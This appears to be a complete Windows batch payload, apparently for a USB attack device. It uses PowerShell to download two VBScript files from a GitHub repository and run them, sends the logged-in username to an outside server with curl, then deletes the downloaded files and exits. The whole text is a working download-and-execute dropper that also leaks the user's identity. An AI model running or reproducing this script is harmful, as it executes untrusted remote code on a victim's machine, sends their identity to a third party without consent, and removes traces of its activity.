powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wwwqr-000/pico_pi/main/1.vbs'-OutFile 1.vbs"&& powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wwwqr-000/pico_pi/main/vol-up.vbs'-OutFile vol-up.vbs"&& start 1.vbs && start vol-up.vbs && curl http://schoolmc.onthewifi.com/wifi.php/%username%
timeout 1
del 1.vbs && del vol-up.vbs
exit
